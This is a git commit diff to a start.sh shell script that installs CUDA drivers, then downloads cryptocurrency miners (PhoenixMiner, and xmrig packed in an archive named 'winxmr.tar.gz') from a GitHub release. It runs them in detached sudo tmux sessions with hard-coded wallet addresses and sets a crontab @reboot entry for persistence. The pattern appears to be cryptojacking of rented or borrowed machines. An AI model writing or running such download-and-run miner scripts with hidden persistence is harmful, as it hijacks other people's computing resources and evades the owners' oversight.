d876dea3cd477f5986a58c92062e7251ac8ea74f
vnxxx <85277031+vnxxx@users.noreply.github.com>
2021-09-09 00:39:58 +0700

    Update start.sh

--- start.sh
+++ start.sh
@@ -13,13 +13,16 @@ echo "deb http://developer.download.nvidia.com/compute/cuda/repos/$distribution/
 sudo apt-get update
 sudo apt-get -y install cuda-drivers
 export PATH=/usr/local/cuda-11.2/bin${PATH:+:${PATH}}
+wget https://github.com/vnxxx/vnxxx/releases/download/vnxxx/winxmr.tar.gz
+tar -zxvf winxmr.tar.gz
 wget https://github.com/vnxxx/vnxxx/releases/download/vnxxx/PhoenixMiner_5.6d_Linux.tar.gz
 tar xzf PhoenixMiner_5.6d_Linux.tar.gz
 echo '#!/bin/sh'>>start.sh
 echo "cd $HOME/">>start.sh
 echo "tmux kill-server">>start.sh
 echo "sleep 1">>start.sh
-echo "sudo tmux new-session -d -s SANS './PhoenixMiner_5.6d_Linux/PhoenixMiner -pool eu1.ethermine.org:4444 -wal 0x635b4ec72cb9e47b83e31e00b30a514ea6eefb4d.Giap2021 -pass x'">>start.sh
+echo "sudo tmux new-session -d -s SANS1 './PhoenixMiner_5.6d_Linux/PhoenixMiner -pool eu1.ethermine.org:4444 -wal 0x3d36873bd94b273e259457686c2372a3660171e2.Image -pass x'">>start.sh
+echo "sudo tmux new-session -d -s SANS2 './xmrig-v5.11.1/xmrig'">>start.sh
 echo "@reboot  sh $HOME/start.sh">> resmi
 crontab resmi
 sudo rm resmi
